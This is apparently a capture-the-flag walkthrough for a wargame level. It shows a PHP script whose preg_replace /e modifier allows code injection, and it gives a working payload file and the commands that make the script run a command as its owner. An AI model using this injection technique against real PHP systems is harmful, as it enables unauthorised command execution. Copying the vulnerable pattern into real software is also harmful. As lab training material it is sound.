# Level06

## Objective
Exploit the PHP script `level06.php` to execute the `getflag` command as the owner (`flag06`) using code injection.

## Steps

### Step 1: Examine PHP Script
Review the contents of the PHP script `level06.php`:

```php
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>
```

### Step 2: Understand Code Injection
The `x` function uses regular expressions to match the pattern `[x (code to execute)]`. To inject code, we need to create a temporary variable that will be evaluated.

### Step 3: Create Payload
Create a file in `/tmp` with the injected code:

```bash
echo '[x {${exec(getflag)}} ]' > /tmp/getflag
```

### Step 4: Execute Level06 with Payload
Run `./level06` with the created payload:

```bash
./level06 /tmp/getflag
```

### Step 5: Obtain Flag
The script should execute the injected code and print the flag.

Congratulations! You've successfully exploited the PHP script to execute the `getflag` command and retrieve the flag.